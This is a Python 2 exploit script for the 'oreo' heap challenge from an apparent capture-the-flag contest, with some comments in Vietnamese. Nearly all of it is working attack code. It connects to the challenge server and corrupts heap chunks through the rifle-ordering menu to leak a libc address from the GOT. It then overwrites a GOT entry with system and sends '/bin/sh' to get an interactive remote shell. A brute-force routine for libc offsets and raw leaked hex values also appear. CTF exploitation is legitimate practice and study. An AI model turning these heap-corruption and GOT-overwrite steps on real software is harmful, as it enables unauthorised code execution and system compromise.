__author__ = 'HuyNA'

'''
The Original Rifle Company has the most finest rifles and revolvers in whole Rodeo City!
 However their buildings are pretty secure, so your only chance to get into their offices is by hacking through the Original Rifle Ecommerce Online (OREO) System
 and steal all those pretty weapons from the inside! Makes sense right? Good luck!

Download
nc wildwildweb.fluxfingers.net 1414
'''


import struct
import socket
import telnetlib
import hexdump
import time
import hashlib
import sys
import os
import templatepwn

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
#
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0x99)
    return decode_string

def final_interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')
def demo_sha1(data):
    print hashlib.sha1(data).hexdigest()
def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
def convert_format(rop_array_number):
    rop = ''
    size = len(rop_array_number)
    for i in range(size):
        rop += struct.pack('<I', rop_array_number[i])
    return rop
'''
nc wildwildweb.fluxfingers.net 1414
 socat TCP-LISTEN:1414,reuseaddr,fork EXEC:./oreo
'''
#s = socket.create_connection(('192.168.248.129', 1410))
s = socket.create_connection(('wildwildweb.fluxfingers.net', 1414))

def create_size():
    for i in xrange(0x40):
        # add rifle 2
        print recv_until(s, 'Action: ')
        s.send('1'+'\n')
        print recv_until(s, 'Rifle name: ')
        s.send('aaaa'+'\n')
        print recv_until(s, 'Rifle description: ')
        s.send('bbbb'+'\n')
        time.sleep(0.001)
    print recv_until(s, 'Action:')
    s.send('3\n')

def leak(offset_sub,aaaa,bbbb):
    # set up size of chunk
    create_size()

    # send description => set up size of next chunk
    print recv_until(s, 'Action:')
    s.send('4'+'\n')
    print recv_until(s, 'like to submit with your order:')
    description = 'a'*28+'\x00'*8+'\x41\x00\x00\x00'
    s.send(description+'\n')
    time.sleep(0.001)
    # hien thi de kiem tra cac gia tri
    print recv_until(s, 'Action:')
    s.send('5'+'\n')

    #sys.stdin.read(1)
    time.sleep(0.001)
    # add rifle 1 => thuc chat la
    print recv_until(s, 'Action: ')
    s.send('1'+'\n')
    next_ele = struct.pack('<I',0x0804A2A8)
    print recv_until(s, 'Rifle name: ')
    s.send('a'*27+next_ele+'\n')
    print recv_until(s, 'Rifle description: ')
    s.send('b'*40+'\n')

    # "xoa" vung nho 0x0804A2A8
    print recv_until(s, 'Action:')
    s.send('3\n')

    # realloc mem => gia tri tra ve la: 0x0804A2A8
    print recv_until(s, 'Action: ')
    s.send('1\n')
    got_address = pi(0x0804A258)    # dia chi got table
    aa = got_address
    print recv_until(s, 'Rifle name: ')
    s.send(aa*4+'\n')
    print recv_until(s, 'Rifle description: ')
    s.send(aa*4+'\n')

    # Hien thi lai gia tri vung nho bi leak
    print recv_until(s, 'Action: ')
    s.send('5'+'\n')

    data = recv_until(s, 'Action: ')
    print data

    offset1 = data.find('Order Message: ')
    offset2 = data.find('======================')

    got_data = data[offset1:offset2]

    print got_data
    print got_data[len('Order Message: '):]
    print got_data[len('Order Message: '):].encode('hex')
    got_data = got_data[len('Order Message: '):]
    printf_add = got_data[0:4]
    printf_add = (ui(printf_add))+offset_sub-aaaa-bbbb
    print 'system address = ', hex(printf_add)


    # send description => set up size of next chunk
    system_address = pi(printf_add)
    print system_address
    #system_address = 'aaaa'
    s.send('4'+'\n')
    print recv_until(s, 'Enter any notice you\'d like to submit with your order:')
    s.send(system_address+'\n')
    time.sleep(0.001)
    s.send('/bin/sh\x00'+'\n')
    time.sleep(0.01)
    final_interact(s)

    print s.recv(1024)
    s.send('/bin/sh\x00'+'\n')
    time.sleep(0.01)
    s.send('ls\n')
    s.send('ls\n')
    s.send('ls\n')
    s.send('ls\n')
    print s.recv(1024)
    print s.recv(1024)
    final_interact(s)

leak(51*0x10, 0xEE00, 0x16a00)
# local
#leak(0x1D10, 0xEE00, 0x95c0)

def check_system(offset_sub, aaaa):
    s = socket.create_connection(('wildwildweb.fluxfingers.net', 1414))
    # add rifle 1 => thuc chat la
    recv_until(s, 'Action: ')
    s.send('1'+'\n')
    next_ele = struct.pack('<I',0x0804A2C0)
    recv_until(s, 'Rifle name: ')
    s.send('a'*27+next_ele+'\n')
    recv_until(s, 'Rifle description: ')
    s.send('b'*40+'\n')

    # set description - sau nay muon thay doi dia chi chi can thay doi description
    recv_until(s, 'Action:')
    s.send('4'+'\n')
    got_address = pi(0x0804A234)    # dia chi got table
    recv_until(s, 'like to submit with your order:')
    description = 'a'*0x34+got_address
    s.send(description+'\n')

    # leak mem
    recv_until(s, 'Action: ')
    s.send('2'+'\n')

    data = recv_until(s, 'Action: ')
    #print data
    lines = data.split('\n')
    got_data = lines[9]
    got_data = got_data[len('Description: '):]
    #print got_data
    #print got_data.encode('hex')

    printf_add = got_data[0:4]
    printf_add = (ui(printf_add))+offset_sub-aaaa

    #printf_add = got_data[36:40]
    #printf_add = (ui(printf_add))+offset_sub-aaaa-0x16a00
    print hex(printf_add)
    printf_add = pi(printf_add)
    #print printf_add.encode('hex')

    # set description - sau nay muon thay doi dia chi chi can thay doi description
    s.send('4'+'\n')
    recv_until(s, 'like to submit with your order:')
    description = 'a'*0x34+printf_add
    s.send(description+'\n')

    # leak mem
    print recv_until(s, 'Action: ')
    s.send('2'+'\n')
    count = 0
    while count <= 3:
        data = recv_until(s, '\n')
        if '===================================' in data:
            count +=1
        if 'Description:' in data:
            print 'offset 0: '
            print data[len('Description: '):].encode('hex')
        elif 'Name: ' in data:
            print 'offset 25: '
            print data[len('Name: '):].encode('hex')

    s.close()

def brute_force():
    system_offset_0 = '5383EC'
    system_offset_25 = '085BE9'
    range3 = 0xDD0
    range1 = 100
    range2 = 0
    for i in range(51, 50, -1):
        try:
            print i
            aaaa = 0xEE00
            print aaaa
            check_system(i*0x10, aaaa)
        except:
            print 'Error ===================================================='

#brute_force()






'''
0fb64424300f8585040a


5383ec18e8fac30d0a
5383ec18e8fac30d0a
2420894424048b838cffffff8b0a

c01567f7

0xf7590970L


60df69f7
a0a168f7
96840408
50d969f7
40be68f7
c6840408
10aa6af7
f0cd63f7
c07f68f7

c00f66f7
0a


c08559f7
604f5cf7
a0115bf7
96840408
50495cf7
402e5bf7
c6840408
101a5df7
f03d56f7
c0ef5af7
0a

'''